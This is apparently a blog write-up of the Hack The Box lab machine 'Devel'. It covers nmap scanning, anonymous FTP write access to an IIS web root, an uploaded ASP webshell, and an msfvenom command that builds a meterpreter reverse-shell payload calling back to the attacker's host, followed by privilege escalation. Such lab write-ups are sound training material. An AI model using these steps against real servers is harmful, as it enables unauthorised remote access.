---
image: /assets/img/devel/devel.png
layout: post
title: Devel
date: 2020-10-1 00:00:01 +5:30
categories: [Hackthebox, Easy]
tags: [ftp, iis, windows] # add tag
---

## Summary

> There are 2 ports open 21 and 80 <br />
> We have write permission in FTP and it is common to web directory<br />
> Generated an asp reverse shell and get meterpreter<br />
> Using local_exploit_suggester check for local exploits <br />
> Exploit and get priv shell.

## Walkthrough

### Enumeration

```terminal
argenestel@parrot  ~/Desktop/hackthebox/devel  nmap -sC -sV 10.10.10.5
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 12:43 IST
Nmap scan report for 10.10.10.5
Host is up (0.38s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:  
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:  
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.44 seconds
```

We can see Anonymous FTP login

```terminal
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
 ```

Checking web servers

 ![port80](/assets/img/devel/port80.png)

On looking into directory, it turns out be same as ftp.

So we have write privs in ftp and the machine is running windows iis so we can upload .asp reverse shell.

### Exploitation

```terminal
argenestel@parrot  ~/Desktop/hackthebox/devel  cp /usr/share/webshells/asp/cmdasp.asp .
argenestel@parrot  ~/Desktop/hackthebox/devel  ftp 10.10.10.5                           
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:argenestel): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put cmdasp.asp
local: cmdasp.asp remote: cmdasp.asp
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1581 bytes sent in 0.00 secs (12.4608 MB/s)
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
10-07-20  06:29PM                 1241 cmd.asp
10-07-20  06:31PM                 1581 cmdasp.asp
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.

```
Alright so we can really edit in ftp. I tested by uploading a webshell.

![aspx](/assets/img/devel/cmdasp.png)

Now it's time to get meterpreter shell.

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f aspx> exploit.aspx      

uploaded this in ftp.

![msf](/assets/img/devel/msf.png)

### PostExploitation

Now we have meterpreter let's see local_exploit_suggester.

I landed on many exploits tried a few and one worked for me.

![privshell](/assets/img/devel/privshell.png)

Rooted :)
